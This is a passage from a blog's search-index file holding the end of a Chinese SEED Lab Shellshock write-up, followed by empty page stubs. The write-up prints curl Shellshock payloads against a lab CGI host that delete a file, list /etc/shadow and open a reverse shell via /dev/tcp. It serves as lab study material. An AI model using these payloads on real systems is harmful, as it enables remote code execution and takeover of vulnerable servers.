title="删除创建的文件"></a>删除创建的文件</h3><p>使用-e选项<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/rm /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><h3 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h3><p>1.不能读取/ect/shadow文件，因为只有root用户以及处于shadow用户组的用户才有读取权限<br>2.不可以（对于我来说）通过在GET请求的数据部分插入代码，这是因为<code>?</code>后面只能跟连续的字符串。curl中?后面加上空格会显示<strong>bad request</strong>,而进行一些编码等处理后会原封不动的赋值给环境变量，从而无法成功的进行解析。</p><h2 id="通过Shellshock创建反向shell"><a href="#通过Shellshock创建反向shell" class="headerlink" title="通过Shellshock创建反向shell"></a>通过Shellshock创建反向shell</h2><p>在发现服务器存在任意命令执行漏洞后，为了我们进一步的攻击往往需要创建一个交互式的shell。反向shell的原理在这里就不在说明。<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>最终成功的反弹了一个shell<br><img src="https://s2.loli.net/2022/01/23/HgPU8qkNlaI3KA9.png" alt="image.png"><br>作者在这里是直接反弹到了本地虚拟机的ens33端口，由于docker的网络配置其他IP地址可能不会成功反弹shell。</p><h2 id="使用打过补丁的Bash"><a href="#使用打过补丁的Bash" class="headerlink" title="使用打过补丁的Bash"></a>使用打过补丁的Bash</h2><p>修复之后的Bash会直接将函数后面的内容忽略掉，所以不会成功的执行上面命令。具体操作不再展示。</p><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>对于Linux操作系统来说任何对象均为文件，建立的TCP连接也是一样的，不同编程语言版本的反向shell都是将标准输入、输出的文件描述符重定向到TCP连接的文件描述符从而实现远程控制。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><h2 id="curl发送的编码问题"><a href="#curl发送的编码问题" class="headerlink" title="curl发送的编码问题"></a>curl发送的编码问题</h2><p>在GET请求的数据部分发送POC时大括号会消失:<br>原请求<code>curl -v &#39;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?()+&#123;+echo+&quot;hello&quot;;+&#125;;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l&#39;</code><br>返回的内容<code>QUERY_STRING=()++echo+&quot;hello&quot;;+;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l</code><br>需要使用转义符号<code>\</code>进行转义。<br>GET请求中的一些特殊字符比如空格等，需要进行编码之后进行发送。<br>POST请求如果带有特殊字符可以使用<code>--data-urlencode</code>进行编码或者使用转义字符。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> CVE </tag>
            
            <tag> bash </tag>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/2022/01/22/Hello/"/>
      <url>/2022/01/22/Hello/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网上的小伙伴们，大家好！<br>这是我的第一个博客，在这里会记录我的学习过程。<br>希望里面的文章会对你有所帮助!</p><div class="note success modern"><p>Keep Learning!</p></div>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>books</title>
      <link href="/books/index.html"/>
      <url>/books/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>music</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>movies</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
